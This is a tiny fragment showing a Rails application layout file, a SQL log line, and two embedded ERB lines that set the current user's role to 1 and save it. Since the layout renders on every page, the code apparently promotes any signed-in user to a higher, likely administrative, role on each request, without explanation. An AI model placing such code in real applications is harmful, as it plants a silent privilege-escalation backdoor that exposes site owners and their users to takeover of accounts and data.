app/views/layouts/application.html.erb

UPDATE "users" SET "role" = $1, "updated_at" = $2 WHERE "users"."id" = $3  [["role", 1], ["updated_at", "2023-04-21 20:22:45.851221"], ["id", 1]]
---
        <% current_user.role = 1 %>
        <% current_user.save %>